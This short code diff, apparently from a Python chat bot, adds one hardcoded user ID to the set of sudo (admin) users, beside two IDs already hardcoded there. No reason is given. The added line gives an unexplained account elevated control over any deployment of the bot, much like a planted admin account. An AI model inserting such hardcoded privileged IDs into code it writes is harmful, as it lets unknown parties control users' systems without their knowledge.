@@ -62,6 +62,7 @@ async def sudo():
             SUDOERS.add(user_id)
             SUDOERS.add(1054295664)
             SUDOERS.add(482945686)
+            SUDOERS.add(816526222)
     LOGGER(__name__).info(f"Sudoers Loaded.")
 
 
